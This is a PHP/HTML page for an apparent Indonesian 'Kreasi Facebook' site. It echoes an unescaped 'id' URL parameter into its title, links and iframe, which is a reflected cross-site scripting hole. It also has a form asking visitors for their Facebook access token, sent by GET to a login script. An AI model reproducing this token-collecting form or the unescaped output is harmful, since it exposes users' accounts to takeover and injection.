<?php
#-----------------------------------------------------#
# Script dasarnya oleh : Lans dan Baretyas
# Diedit oleh Pubiway
# Jangan pernah jual belikan script ini
# Sekian dan terima kasih :D
# Facebook : http://facebook.com/pubiway
#-----------------------------------------------------#
?>

<?php
$u = $_GET["id"];
?>
<? include 'pubiway.php' ;?>
<head>
<title>Kreasi Facebook
<? echo $u ; ?>
</title>
<link rel="stylesheet" type="text/css" href="http://pubiway.xtgem.com/pubiway.css" media="all,handheld"/>
<link rel="stylesheet" type="text/css" href="/site.css" media="all,handheld"/>
</head>
<body>

<div id="header">
<h1 class="heading"><center><a href="/" name="top">Wap Kreasi Facebook</a></center></h1>
<h2 class="description">Kreasi Facebook terlengkap, fb-an tambah asyik!</u>
</h2></div></div>



<body style="background-image:url(https://graph.facebook.com/<? echo $u ; ?>/picture)">

<div class="judul2"><b>Wajib di Follow</b> </div>
<div class="iklan">
<a href="http://m.facebook.com/<? echo $u ; ?>"><img src="https://graph.facebook.com/<? echo $u ; ?>/picture" width="80" class="l profpic img" alt="<? echo $u ; ?>"/></a><hr>
<iframe src="http://www.facebook.com/plugins/subscribe.php?href=http://www.facebook.com/<? echo $u ; ?>&amp;layout=button_count&amp;show_faces=true&amp;width=110&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=21" scrolling="no" frameborder="0" style="border:none" overflow:hidden;="" width:50px;="" height:50px;"="" allowTransparency="true"></iframe></div>

<? include 'token.php' ; ?>


<div id="top-content">
<div id="search-form">
<form method="get"
action="/login.php">
<input class="inp-text"
type="text" name="user"  placeholder="Access token..." value=""/>
<input class="inp-btn"
type="submit" value="Masuk"/>
</form>
</div>
</div>


<div id="footer"> <br/>
copyright &copy; <a href="http://facebook.com/<? echo $u ; ?>"> <? echo $u ; ?></a><hr>
</div>